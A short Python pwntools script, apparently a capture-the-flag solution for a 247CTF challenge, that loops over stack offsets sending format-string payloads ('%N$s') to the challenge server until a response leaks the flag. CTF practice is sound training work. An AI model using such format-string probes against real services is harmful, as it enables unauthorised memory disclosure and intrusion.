from pwn import *

URL="cd1675cadcb9e7d1.247ctf.com"
PORT=50223

for i in range(50,100):
	conn = remote(URL,PORT)
	fstring ="%"+str(i)+"$s\n"
	p = conn.recvline()
	p = conn.recvline()
	conn.send(fstring)
	try:
		p = conn.recvline()
		if b'247CTF' in p:
			print(p)
			print(i)
			break
	except EOFError:
		continue
	conn.close()
